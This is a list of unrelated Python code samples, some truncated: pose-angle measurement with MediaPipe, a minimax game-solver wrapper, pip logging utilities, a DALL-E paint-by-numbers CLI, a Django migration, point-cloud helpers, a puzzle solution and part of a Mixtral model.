    "import cv2\r\nimport mediapipe as mp\r\nimport numpy as np\r\nimport pandas as pd\r\nimport time\r\nimport json\r\n\r\nmp_drawing = mp.solutions.drawing_utils\r\nmp_pose = mp.solutions.pose\r\na = time.monotonic()\r\n\r\n#\u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0441\u043f\u0438\u0441\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0443\u0433\u043b\u043e\u0432\r\nlist_angle_right_golen_right_camera = []\r\nlist_angle_right_kolen_right_camera = []\r\nlist_angle_right_bed_right_camera = []\r\nlist_angle_right_camera = []\r\n\r\n# \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c json \u0444\u0430\u0439\u043b \u0447\u0442\u043e\u0431\u044b \u0432\u0437\u044f\u0442\u044c \u0438\u0437 \u043d\u0435\u0433\u043e \u0438\u043d\u0434\u0435\u043a\u0441 \u043f\u0443\u0442\u0438 \u043a\u0430\u043c\u0435\u0440\u044b\r\nwith open('camera_index.json') as fcc_file:\r\n    index_cam = json.load(fcc_file)\r\n\r\n# \u0412\u0438\u0434\u0435\u043e \u043f\u043e\u0442\u043e\u043a\r\ncap = cv2.VideoCapture(index_cam['ri'])\r\n# \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043c\u0435\u0434\u0438\u043f\u0430\u0439\u043f\r\nwith mp_pose.Pose(min_detection_confidence=0.5, min_tracking_confidence=0.5) as pose:\r\n    while cap.isOpened():\r\n        ret, frame = cap.read()\r\n\r\n        res = cv2.resize(frame, (600, 500))\r\n\r\n        # \u041e\u0431\u043d\u0430\u0440\u0443\u0436\u0435\u043d\u0438\u0435 \u0432\u0435\u0449\u0435\u0439 \u0438 \u0440\u0435\u043d\u0434\u0435\u0440\u0438\u043d\u0433\r\n        # \u043f\u0435\u0440\u0435\u043a\u0440\u0430\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438\r\n        image = cv2.cvtColor(res, cv2.COLOR_BGR2RGB)\r\n        image.flags.writeable = False\r\n\r\n        # \u0434\u0435\u0442\u0435\u043a\u0446\u0438\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\r\n        results = pose.process(image)\r\n\r\n        # \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u0432 bgr\r\n        image.flags.writeable = True\r\n        image = cv2.cvtColor(image, cv2.COLOR_RGB2BGR)\r\n\r\n        # \u0418\u0437\u0432\u043b\u0435\u0447\u0435\u043d\u0438\u0435 \u043e\u0440\u0438\u0435\u043d\u0442\u0438\u0440\u043e\u0432\r\n        try:\r\n            landmarks = results.pose_landmarks.landmark\r\n\r\n            # \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0442\u043e\u0447\u0435\u043a \u043f\u0440\u0430\u0432\u043e\u0439 \u0433\u043e\u043b\u0435\u043d\u0438\r\n            r_knee_golen = [landmarks[mp_pose.PoseLandmark.RIGHT_KNEE.value].x,\r\n                      landmarks[mp_pose.PoseLandmark.RIGHT_KNEE.value].y]\r\n            r_ankle_golen = [landmarks[mp_pose.PoseLandmark.RIGHT_ANKLE.value].x,\r\n                       landmarks[mp_pose.PoseLandmark.RIGHT_ANKLE.value].y]\r\n            r_foot_golen = [landmarks[mp_pose.PoseLandmark.RIGHT_FOOT_INDEX.value].x,\r\n                      landmarks[mp_pose.PoseLandmark.RIGHT_FOOT_INDEX.value].y]\r\n            # \u041a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440 \u0443\u0433\u043b\u043e\u0432\r\n            a_r_knee_golen = np.array(r_knee_golen)  # First\r\n            b_r_ankle_golen = np.array(r_ankle_golen)  # Mid\r\n            c_r_foot_golen = np.array(r_foot_golen)  # End\r\n            radians_right_golen = np.arctan2(c_r_foot_golen[1] - b_r_ankle_golen[1], c_r_foot_golen[0] - b_r_ankle_golen[0]) - np.arctan2(a_r_knee_golen[1] - b_r_ankle_golen[1], a_r_knee_golen[0] - b_r_ankle_golen[0])\r\n            angle_right_golen = np.abs(radians_right_golen * 360 // np.pi)\r\n            if angle_right_golen > 180:\r\n                angle_right_golen = 360 - angle_right_golen\r\n                angle_right_golen -= 35\r\n            list_angle_right_golen_right_camera.append(angle_right_golen)\r\n\r\n            # \u0412\u0438\u0437\u0443\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f\r\n            cv2.putText(image, str(angle_right_golen),\r\n                        tuple(np.multiply(r_ankle_golen, [640, 480]).astype(int)),\r\n                        cv2.FONT_HERSHEY_SIMPLEX, 0.5, (255, 255, 255), 2, cv2.LINE_AA\r\n                        )\r\n\r\n\r\n\r\n            # \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0442\u043e\u0447\u0435\u043a \u043f\u0440\u0430\u0432\u043e\u0439 \u043a\u043e\u043b\u0435\u043d\u043a\u0438\r\n            r_hip_kolen = [landmarks[mp_pose.PoseLandmark.RIGHT_HIP.value].x,\r\n                           landmarks[mp_pose.PoseLandmark.RIGHT_HIP.value].y]\r\n            r_knee_kolen = [landmarks[mp_pose.PoseLandmark.RIGHT_KNEE.value].x,\r\n                            landmarks[mp_pose.PoseLandmark.RIGHT_KNEE.value].y]\r\n            r_ankle_kolen = [landmarks[mp_pose.PoseLandmark.RIGHT_ANKLE.value].x,\r\n                             landmarks[mp_pose.PoseLandmark.RIGHT_ANKLE.value].y]\r\n            # \u041a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440 \u0443\u0433\u043b\u043e\u0432\r\n            a_r_hip_kolen = np.array(r_hip_kolen)  # First\r\n            b_r_knee_kolen = np.array(r_knee_kolen)  # Mid\r\n            c_r_ankle_kolen = np.array(r_ankle_kolen)  # End\r\n            radians_right_kolen = np.arctan2(c_r_ankle_kolen[1] - b_r_knee_kolen[1], c_r_ankle_kolen[0] - b_r_knee_kolen[0]) - np.arctan2(a_r_hip_kolen[1] - b_r_knee_kolen[1], a_r_hip_kolen[0] - b_r_knee_kolen[0])\r\n            angle_right_kolen = np.abs(radians_right_kolen * 180 // np.pi)\r\n            if 0 < angle_right_kolen > 150.0:\r\n                angle_right_kolen = 360 - angle_right_kolen\r\n                angle_right_kolen = 180 - angle_right_kolen\r\n            list_angle_right_kolen_right_camera.append(angle_right_kolen)\r\n\r\n\r\n            # \u0412\u0438\u0437\u0443\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f\r\n            cv2.putText(image, str(angle_right_kolen),\r\n                        tuple(np.multiply(r_knee_kolen, [640, 480]).astype(int)),\r\n                        cv2.FONT_HERSHEY_SIMPLEX, 0.5, (255, 255, 255), 2, cv2.LINE_AA\r\n                        )\r\n\r\n            # \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0442\u043e\u0447\u0435\u043a \u043f\u0440\u0430\u0432\u043e\u0433\u043e \u0431\u0435\u0434\u0440\u0430\r\n            r_shoulder_bed = [landmarks[mp_pose.PoseLandmark.RIGHT_SHOULDER.value].x,\r\n                              landmarks[mp_pose.PoseLandmark.RIGHT_SHOULDER.value].y]\r\n            r_hip_bed = [landmarks[mp_pose.PoseLandmark.RIGHT_HIP.value].x,\r\n                         landmarks[mp_pose.PoseLandmark.RIGHT_HIP.value].y]\r\n            r_knee_bed = [landmarks[mp_pose.PoseLandmark.RIGHT_KNEE.value].x,\r\n                          landmarks[mp_pose.PoseLandmark.RIGHT_KNEE.value].y]\r\n            # \u041a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440 \u0443\u0433\u043b\u043e\u0432\r\n    ",
    "import os\nfrom ctypes import byref, CDLL, POINTER, Structure, c_int, c_uint, c_size_t, c_void_p, c_float\n\n\np = os.path.dirname(os.path.abspath(__file__)) + \"/../resources\"\nos.environ[\"PATH\"] = p + os.pathsep + os.environ[\"PATH\"]\nlib_minmax = CDLL(os.path.join(p, \"minmax.so\"))\n\nround_limits = {\n    1: 10,\n    2: 40,\n    3: 20,\n    4: 80,\n}\n\n\"\"\"\nGH Min max wrapper\n\"\"\"\n\n\nclass LeverState(Structure):\n    _fields_ = [\n        (\"state\", c_int),\n        (\"coin\", c_uint)\n    ]\n\n    def __init__(self, state: int, coin: int):\n        self.state = state\n        self.coin = coin\n\n\nclass BoardState(Structure):\n    _fields_ = [\n        (\"round\", c_uint),\n        (\"round_scores\", c_uint*2),\n        (\"last_round_drop\", c_uint),\n        (\"scores\", c_uint*2),\n        (\"levers\", LeverState*40),\n        (\"last_round_halved\", c_uint),\n        (\"current_player\", c_uint)\n    ]\n\n    def __init__(self, board_state: dict, game_state: dict, player: int):\n        self.round = game_state[\"game_round\"] - 1\n        self.round_scores[0] = game_state[\"left_score\"]\n        self.round_scores[1] = game_state[\"right_score\"]\n        self.last_round_drop = game_state['left_score'] >= round_limits[game_state[\"game_round\"]] or game_state['right_score'] >= round_limits[game_state[\"game_round\"]]\n        if self.last_round_drop:\n            print(\"LAST ROUND DROP\")\n        self.scores[0] = game_state[\"player_left_total\"]\n        self.scores[1] = game_state[\"player_right_total\"]\n        self.last_round_halved = 0\n        self.current_player = player\n\n        LEVERS_IN_PREVIOUS_ROWS = [0, 4, 9, 15, 22]\n        for row in range(5):\n            for col in range(0, row+4):\n                my_index = LEVERS_IN_PREVIOUS_ROWS[row] + col\n                gh_index = 8*row + col\n                lever_state = LeverState(\n                    board_state[my_index]['pos'],\n                    board_state[my_index]['coin']\n                )\n                self.levers[gh_index] = lever_state\n\n\nclass Result(Structure):\n    _fields_ = [\n        (\"move\", c_uint),\n        (\"score\", c_int),\n        (\"depth\", c_int)\n    ]\n\n\nclass HashTable(Structure):\n    _fields_ = [\n        (\"size\", c_size_t),\n        (\"entry_count\", c_uint),\n        (\"entries\", c_void_p),\n    ]\n\n\n# void tdgame_print(tdgame_t* game);\ntdgame_print = lib_minmax.tdgame_print\ntdgame_print.argtypes = [POINTER(BoardState)]\n\n# uint_t tdgame_drop_coin(tdgame_t* game, uint_t slot);\ntdgame_drop_coin = lib_minmax.tdgame_drop_coin\ntdgame_drop_coin.argtypes = [POINTER(BoardState), c_uint]\ntdgame_drop_coin.restype = c_uint\n\n# int tdgame_ht_init(tdgame_ht_t *ht, size_t size);\n_tdgame_ht_init = lib_minmax.tdgame_ht_init\n_tdgame_ht_init.argtypes = [POINTER(HashTable), c_size_t]\n_tdgame_ht_init.restype = c_int\ndef hash_table_init(ht: HashTable, size: int):\n    print(f\"Hash table size: {size}\")\n    r = _tdgame_ht_init(byref(ht), size)\n    print(f\"Initialized hash table of size {ht.size}\")\n\n# float tdgame_ht_usage(tdgame_ht_t * ht);\n_tdgame_ht_usage = lib_minmax.tdgame_ht_usage\n_tdgame_ht_usage.argtypes = [POINTER(HashTable)]\n_tdgame_ht_usage.restype = c_float\ndef hash_table_usage(ht: HashTable) -> float:\n    return _tdgame_ht_usage(byref(ht))\n\n# void tdgame_ht_free(tdgame_ht_t * ht);\n_tdgame_ht_free = lib_minmax.tdgame_ht_free\n_tdgame_ht_free.argtypes = [POINTER(HashTable)]\ndef hash_table_free(ht: HashTable):\n    return _tdgame_ht_free(byref(ht))\n\n# Result tdgame_solve(tdgame_t* game, tdgame_ht_t * ht, int timeout_ms)\n_tdgame_solve = lib_minmax.tdgame_solve\n_tdgame_solve.argtypes = [POINTER(BoardState), POINTER(HashTable), c_int]\n_tdgame_solve.restype = Result\ndef tdgame_solve(board_state: BoardState, ht: HashTable, timeout_ms: int) -> Result:\n    return _tdgame_solve(byref(board_state), byref(ht), timeout_ms)\n\n# Result tdgame_solve_threaded(tdgame_t* game, tdgame_ht_t * ht, int timeout_ms);\n_tdgame_solve_threaded = lib_minmax.tdgame_solve_threaded\n_tdgame_solve_threaded.argtypes = [POINTER(BoardState), POINTER(HashTable), c_int]\n_tdgame_solve_threaded.restype = Result\ndef tdgame_solve_threaded(board_state: BoardState, ht: HashTable, timeout_ms: int) -> Result:\n    return _tdgame_solve_threaded(byref(board_state), byref(ht), timeout_ms)\n",
    "# The following comment should be removed at some point in the future.\n# mypy: disallow-untyped-defs=False\n\nfrom __future__ import absolute_import\n\nimport contextlib\nimport errno\nimport logging\nimport logging.handlers\nimport os\nimport sys\nfrom logging import Filter, getLogger\n\nfrom pip._vendor.six import PY2\n\nfrom pip._internal.utils.compat import WINDOWS\nfrom pip._internal.utils.deprecation import DEPRECATION_MSG_PREFIX\nfrom pip._internal.utils.misc import ensure_dir\n\ntry:\n    import threading\nexcept ImportError:\n    import dummy_threading as threading  # type: ignore\n\n\ntry:\n    # Use \"import as\" and set colorama in the else clause to avoid mypy\n    # errors and get the following correct revealed type for colorama:\n    # `Union[_importlib_modulespec.ModuleType, None]`\n    # Otherwise, we get an error like the following in the except block:\n    #  > Incompatible types in assignment (expression has type \"None\",\n    #   variable has type Module)\n    # TODO: eliminate the need to use \"import as\" once mypy addresses some\n    #  of its issues with conditional imports. Here is an umbrella issue:\n    #  https://github.com/python/mypy/issues/1297\n    from pip._vendor import colorama as _colorama\n# Lots of different errors can come from this, including SystemError and\n# ImportError.\nexcept Exception:\n    colorama = None\nelse:\n    # Import Fore explicitly rather than accessing below as colorama.Fore\n    # to avoid the following error running mypy:\n    # > Module has no attribute \"Fore\"\n    # TODO: eliminate the need to import Fore once mypy addresses some of its\n    #  issues with conditional imports. This particular case could be an\n    #  instance of the following issue (but also see the umbrella issue above):\n    #  https://github.com/python/mypy/issues/3500\n    from pip._vendor.colorama import Fore\n\n    colorama = _colorama\n\n\n_log_state = threading.local()\n_log_state.indentation = 0\nsubprocess_logger = getLogger('pip.subprocessor')\n\n\nclass BrokenStdoutLoggingError(Exception):\n    \"\"\"\n    Raised if BrokenPipeError occurs for the stdout stream while logging.\n    \"\"\"\n    pass\n\n\n# BrokenPipeError does not exist in Python 2 and, in addition, manifests\n# differently in Windows and non-Windows.\nif WINDOWS:\n    # In Windows, a broken pipe can show up as EINVAL rather than EPIPE:\n    # https://bugs.python.org/issue19612\n    # https://bugs.python.org/issue30418\n    if PY2:\n        def _is_broken_pipe_error(exc_class, exc):\n            \"\"\"See the docstring for non-Windows Python 3 below.\"\"\"\n            return (exc_class is IOError and\n                    exc.errno in (errno.EINVAL, errno.EPIPE))\n    else:\n        # In Windows, a broken pipe IOError became OSError in Python 3.\n        def _is_broken_pipe_error(exc_class, exc):\n            \"\"\"See the docstring for non-Windows Python 3 below.\"\"\"\n            return ((exc_class is BrokenPipeError) or  # noqa: F821\n                    (exc_class is OSError and\n                     exc.errno in (errno.EINVAL, errno.EPIPE)))\nelif PY2:\n    def _is_broken_pipe_error(exc_class, exc):\n        \"\"\"See the docstring for non-Windows Python 3 below.\"\"\"\n        return (exc_class is IOError and exc.errno == errno.EPIPE)\nelse:\n    # Then we are in the non-Windows Python 3 case.\n    def _is_broken_pipe_error(exc_class, exc):\n        \"\"\"\n        Return whether an exception is a broken pipe error.\n\n        Args:\n          exc_class: an exception class.\n          exc: an exception instance.\n        \"\"\"\n        return (exc_class is BrokenPipeError)  # noqa: F821\n\n\n@contextlib.contextmanager\ndef indent_log(num=2):\n    \"\"\"\n    A context manager which will cause the log output to be indented for any\n    log messages emitted inside it.\n    \"\"\"\n    _log_state.indentation += num\n    try:\n        yield\n    finally:\n        _log_state.indentation -= num\n\n\ndef get_indentation():\n    return getattr(_log_state, 'indentation', 0)\n\n\nclass IndentingFormatter(logging.Formatter):\n\n    def __init__(self, *args, **kwargs):\n        \"\"\"\n        A logging.Formatter that obeys the indent_log() context manager.\n\n        :param add_timestamp: A bool indicating output lines should be prefixed\n            with their record's timestamp.\n        \"\"\"\n        self.add_timestamp = kwargs.pop(\"add_timestamp\", False)\n        super(IndentingFormatter, self).__init__(*args, **kwargs)\n\n    def get_message_start(self, formatted, levelno):\n        \"\"\"\n        Return the start of the formatted log message (not counting the\n        prefix to add to each line).\n        \"\"\"\n        if levelno < logging.WARNING:\n            return ''\n        if formatted.startswith(DEPRECATION_MSG_PREFIX):\n            # Then the message already has a prefix.  We don't want it to\n            # look like \"WARNING: DEPRECATION: ....\"\n            return ''\n        if levelno < logging.ERROR:\n            return 'WARNING: '\n\n        return 'ERROR: '\n\n    def format(self, record):\n        \"\"\"\n        Calls the standard formatter, but will indent all of the log mes",
    "import click\nfrom dotenv import load_dotenv\nimport cv2\n\nfrom model import create\nfrom model import trigger_dalle\nfrom model import save_file\n\n@click.command()\n@click.option('--mode', default=None, help='create a new image using Dall-E or a variation of an existing image, options - v/C')\n@click.option('--image_path', default=None, help='path to the image')\n@click.option('--prompt', default=None, help='prompt to create/edit the image')\n@click.option('--palette_count', default=10, help='number of colors for your palette')\ndef run(mode, image_path, prompt, palette_count):\n    load_dotenv()\n    click.echo(\"Welcome to Paint By Numbers\")\n    if mode == 'C' and not prompt:\n        click.echo(\"Please enter a prompt\")\n        return \n    if mode == 'v' and not image_path:\n        click.echo(\"Please enter a path\")\n        return\n    \n    image_path = trigger_dalle(image_path, prompt, mode)\n    pbk_image = create(image_path, n_clusters=palette_count)\n    pbk_image_path = save_file(pbk_image, prompt)\n    click.echo(pbk_image_path)\n\n    cv2.imshow('PBK Image', pbk_image)\n    cv2.waitKey(0)\n    cv2.destroyAllWindows()\n\n\n\nif __name__ == '__main__':\n    run()",
    "# Generated by Django 5.0.2 on 2024-02-17 11:41\n\nimport django.db.models.deletion\nfrom django.conf import settings\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('myapp', '0001_initial'),\n        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Admin',\n            fields=[\n                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('user', models.OneToOneField(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL)),\n            ],\n        ),\n        migrations.CreateModel(\n            name='Expense',\n            fields=[\n                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('name', models.CharField(max_length=100)),\n                ('amount', models.DecimalField(decimal_places=2, max_digits=10)),\n                ('date', models.DateField()),\n                ('category', models.CharField(max_length=100)),\n                ('user', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL)),\n            ],\n        ),\n        migrations.CreateModel(\n            name='FinancialReport',\n            fields=[\n                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('report_date', models.DateField()),\n                ('user', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL)),\n            ],\n        ),\n        migrations.CreateModel(\n            name='Income',\n            fields=[\n                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('source', models.CharField(max_length=100)),\n                ('amount', models.DecimalField(decimal_places=2, max_digits=10)),\n                ('date', models.DateField()),\n                ('category', models.CharField(max_length=100)),\n                ('user', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL)),\n            ],\n        ),\n        migrations.CreateModel(\n            name='UserProfile',\n            fields=[\n                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('user', models.OneToOneField(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL)),\n            ],\n        ),\n        migrations.DeleteModel(\n            name='Contact',\n        ),\n    ]\n",
    "import torch\n\ndef index_points(points, idx):\n    \"\"\"\n    Input:\n        points: input points data, [B, N, C]\n        idx: sample index data, [B, S]\n    Return:\n        new_points:, indexed points data, [B, S, C]\n    \"\"\"\n    device = points.device\n    B = points.shape[0]\n    view_shape = list(idx.shape)\n    view_shape[1:] = [1] * (len(view_shape) - 1)\n    repeat_shape = list(idx.shape)\n    repeat_shape[0] = 1\n    batch_indices = torch.arange(B, dtype=torch.long).to(device).view(view_shape).repeat(repeat_shape)\n    new_points = points[batch_indices, idx, :]\n    return new_points\n\ndef knn_point(nsample, xyz, new_xyz):\n    \"\"\"\n    Input:\n        nsample: max sample number in local region\n        xyz: all points, [B, N, C]\n        new_xyz: query points, [B, S, C]\n    Return:\n        group_idx: grouped points index, [B, S, nsample]\n    \"\"\"\n    sqrdists = square_distance(new_xyz, xyz)\n    _, group_idx = torch.topk(sqrdists, nsample, dim = -1, largest=False, sorted=False)\n    return group_idx\n\ndef square_distance(src, dst):\n    \"\"\"\n    Calculate Euclid distance between each two points.\n    src^T * dst = xn * xm + yn * ym + zn * zm\uff1b\n    sum(src^2, dim=-1) = xn*xn + yn*yn + zn*zn;\n    sum(dst^2, dim=-1) = xm*xm + ym*ym + zm*zm;\n    dist = (xn - xm)^2 + (yn - ym)^2 + (zn - zm)^2\n         = sum(src**2,dim=-1)+sum(dst**2,dim=-1)-2*src^T*dst\n    Input:\n        src: source points, [B, N, C]\n        dst: target points, [B, M, C]\n    Output:\n        dist: per-point square distance, [B, N, M]\n    \"\"\"\n    B, N, _ = src.shape\n    _, M, _ = dst.shape\n    dist = -2 * torch.matmul(src.float(), dst.permute(0, 2, 1).float())\n    dist += torch.sum(src ** 2, -1).view(B, N, 1)\n    dist += torch.sum(dst ** 2, -1).view(B, 1, M)\n    return dist",
    "traitMap = {\n    \"x\":0,\n    \"m\":1,\n    \"a\":2,\n    \"s\":3\n}\n\ndef solvepart1():\n    #read in data\n    data = fileRead(\"input.txt\")\n    partsReached = False\n    workflows = {}\n    parts = []\n    for rawRow in data:\n        row = rawRow.strip()\n        if row == \"\":\n            partsReached = True\n            continue\n        if not partsReached:\n            line = row.split(\"{\")\n            name = line[0]\n            steps = line[1][:-1].split(\",\")\n            workflows[name] = tuple(steps)\n        else:\n            vals = row[1:-1].split(\",\")\n            parts.append((int(vals[0][2:]),int(vals[1][2:]),int(vals[2][2:]),int(vals[3][2:])))\n\n    #determine whether each part should be rejected or not\n    sum = 0\n    for part in parts:\n        valid = acceptOrRejectPart(part, workflows)\n        if valid:\n            sum = sum + (part[0] + part[1] + part[2] + part[3])\n    print(sum)\n\n#goes through workflows and determines whether a part should be rejected or not\ndef acceptOrRejectPart(part, workflows):\n    currentWorkflow = \"in\"\n    while (currentWorkflow not in (\"R\",\"A\")):\n        rules = workflows[currentWorkflow]\n        for rule in rules:\n            if (\"<\" not in rule) and (\">\" not in rule):\n                currentWorkflow = rule\n                break\n            comp, dest = rule.split(\":\")\n            if \"<\" in comp:\n                trait, amount = comp.split(\"<\")\n                if part[traitMap[trait]] < int(amount):\n                    currentWorkflow = dest\n                    break\n            else:\n                trait, amount = comp.split(\">\")\n                if part[traitMap[trait]] > int(amount):\n                    currentWorkflow = dest\n                    break\n\n    if currentWorkflow == \"A\":\n        return True\n    return False\n\ndef solvepart2():\n    #read in data\n    data = fileRead(\"input.txt\")\n    workflows = {}\n    parts = []\n    for rawRow in data:\n        row = rawRow.strip()\n        if row == \"\":\n            break\n        line = row.split(\"{\")\n        name = line[0]\n        steps = line[1][:-1].split(\",\")\n        workflows[name] = tuple(steps)\n\n    #run recursive function to determine the number of possible parts\n    numParts = acceptOrRejectRange(((1,4001),(1,4001),(1,4001),(1,4001)), \"in\", workflows)\n    print(numParts)\n\n    #determine whether each part should be rejected or not\n    \n#recursively takes a range through the workflow, splitting it into multiple ranges as necessary\n#returns number of possible accepted parts\ndef acceptOrRejectRange(partRange, currentWorkflow, workflows):\n    if (currentWorkflow == \"R\"):\n        return 0\n    if (currentWorkflow == \"A\"):\n        print(partRange, (partRange[0][1] - partRange[0][0]) * (partRange[1][1] - partRange[1][0]) * (partRange[2][1] - partRange[2][0]) * (partRange[3][1] - partRange[3][0]))\n        return (partRange[0][1] - partRange[0][0]) * (partRange[1][1] - partRange[1][0]) * (partRange[2][1] - partRange[2][0]) * (partRange[3][1] - partRange[3][0])\n    \n    sum = 0\n    curPartRange = list(partRange)\n    rules = workflows[currentWorkflow]\n    for rule in rules:\n        if (\"<\" not in rule) and (\">\" not in rule):\n            sum = sum + acceptOrRejectRange(curPartRange, rule, workflows)\n            break\n        comp, dest = rule.split(\":\")\n        if \"<\" in comp:\n            trait, splitPos = comp.split(\"<\")\n            splitPos = int(splitPos)\n            newPartRange = curPartRange.copy()\n            print(\"<\", newPartRange[traitMap[trait]], splitPos)\n            newPartRange[traitMap[trait]] = (newPartRange[traitMap[trait]][0], splitPos)\n            curPartRange[traitMap[trait]] = (splitPos, curPartRange[traitMap[trait]][1])\n            sum = sum + acceptOrRejectRange(tuple(newPartRange), dest, workflows)\n        else:\n            trait, splitPos = comp.split(\">\")\n            splitPos = int(splitPos)\n            newPartRange = curPartRange.copy()\n            print(\">\", newPartRange[traitMap[trait]], splitPos)\n            newPartRange[traitMap[trait]] = (splitPos+1, newPartRange[traitMap[trait]][1])\n            curPartRange[traitMap[trait]] = (curPartRange[traitMap[trait]][0], splitPos+1)\n            sum = sum + acceptOrRejectRange(tuple(newPartRange), dest, workflows)\n    return sum\n\ndef fileRead(name):\n    data = []\n    f = open(name, \"r\")\n    for line in f:\n        data.append(line);\n    return data\n\n\nsolvepart2()",
    "\"\"\" PyTorch Mixtral model.\"\"\"\nimport inspect\nimport math\nimport warnings\nfrom typing import List, Optional, Tuple, Union\n\nimport torch\nimport torch.nn.functional as F\nimport torch.utils.checkpoint\nfrom torch import nn\nfrom torch.nn import BCEWithLogitsLoss, CrossEntropyLoss, MSELoss\nfrom collections import OrderedDict\n\nfrom transformers import PreTrainedModel\n\nfrom config import MixtralConfig\n\nclass ClassInstantier(OrderedDict):\n    def __getitem__(self, key):\n        content = super().__getitem__(key)\n        cls, kwargs = content if isinstance(content, tuple) else (content, {})\n        return cls(**kwargs)\n\nACT2CLS = {\n    \"relu\": nn.ReLU,\n    \"relu6\": nn.ReLU6,\n    \"sigmoid\": nn.Sigmoid,\n    \"silu\": nn.SiLU,\n    \"swish\": nn.SiLU,\n    \"tanh\": nn.Tanh,\n}\nACT2FN = ClassInstantier(ACT2CLS)\n\n\n\n_CONFIG_FOR_DOC = \"MixtralConfig\"\n\n\n\nclass MixtralBlockSparseTop2MLP(nn.Module):\n    def __init__(self, config: MixtralConfig):\n        super().__init__()\n        self.ffn_dim = config.intermediate_size\n        self.hidden_dim = config.hidden_size\n\n        self.w1 = nn.Linear(self.hidden_dim, self.ffn_dim, bias=False)\n        self.w2 = nn.Linear(self.ffn_dim, self.hidden_dim, bias=False)\n        self.w3 = nn.Linear(self.hidden_dim, self.ffn_dim, bias=False)\n\n        self.act_fn = ACT2FN[config.hidden_act]\n\n    def forward(self, hidden_states):\n        current_hidden_states = self.act_fn(self.w1(hidden_states)) * self.w3(hidden_states)\n        current_hidden_states = self.w2(current_hidden_states)\n        return current_hidden_states\n\n\nclass MixtralBLockSparseTop2MLP(MixtralBlockSparseTop2MLP):\n    def __init__(self, *args, **kwargs):\n        logger.warning_once(\n            \"MixtralBLockSparseTop2MLP is deprecated by MixtralBlockSparseTop2MLP and will be removed in v4.40.\"\n        )\n        super().__init__(*args, **kwargs)\n\n\nclass MixtralSparseMoeBlock(nn.Module):\n    \"\"\"\n    This implementation is\n    strictly equivalent to standard MoE with full capacity (no\n    dropped tokens). It's faster since it formulates MoE operations\n    in terms of block-sparse operations to accomodate imbalanced\n    assignments of tokens to experts, whereas standard MoE either\n    (1) drop tokens at the cost of reduced performance or (2) set\n    capacity factor to number of experts and thus waste computation\n    and memory on padding.\n    \"\"\"\n\n    def __init__(self, config):\n        super().__init__()\n        self.hidden_dim = config.hidden_size\n        self.ffn_dim = config.intermediate_size\n        self.num_experts = config.num_local_experts\n        self.top_k = config.num_experts_per_tok\n\n        # gating\n        self.gate = nn.Linear(self.hidden_dim, self.num_experts, bias=False)\n\n        self.experts = nn.ModuleList([MixtralBlockSparseTop2MLP(config) for _ in range(self.num_experts)])\n\n    def forward(self, hidden_states: torch.Tensor) -> torch.Tensor:\n        \"\"\" \"\"\"\n        batch_size, sequence_length, hidden_dim = hidden_states.shape\n        # [20, 512]\n        hidden_states = hidden_states.view(-1, hidden_dim)\n        # router_logits: (batch * sequence_length, n_experts)\n        #  [20,512] * [512,8]   --->   [20,8] \n        router_logits = self.gate(hidden_states)\n        # print(f\"router_logits is {router_logits}\") \n        # print(f\"router_logits1 shape is {router_logits.shape}\")\n        # [20,8]\n        '''\n            \u6bcf\u4e2atoken\u5bf9\u5e94\u7684\u4e13\u5bb6\u7684\u6982\u7387\n        '''\n        routing_weights = F.softmax(router_logits, dim=1, dtype=torch.float)\n        # print(f\"router_logits2 shape is {router_logits.shape}\")\n        print(f\"router_logits3  is {routing_weights}\")\n        # [20,2]\n        # selected_experts\u5bf9\u5e94\u6bcf\u4e2atoken\u9009\u7684\u4e13\u5bb6\u5728[0,7]\u7684\u7d22\u5f15 \u5b83\u662f\u6709\u68af\u5ea6\u7684\n        routing_weights, selected_experts = torch.topk(routing_weights, self.top_k, dim=-1)\n        print(f\"router_logits3 shape is {routing_weights.shape}\")\n        print(f\"router_logits3  is {routing_weights}\")\n\n        routing_weights /= routing_weights.sum(dim=-1, keepdim=True)\n        # print(f\"router_logits4 shape is {router_logits.shape}\")\n        # we cast back to the input dtype\n        routing_weights = routing_weights.to(hidden_states.dtype)\n        # print(f\"router_logits5 shape is {router_logits.shape}\")\n\n        # [20,512] \u51680\u77e9\u9635\n        final_hidden_states = torch.zeros(\n            (batch_size * sequence_length, hidden_dim), dtype=hidden_states.dtype, device=hidden_states.device\n        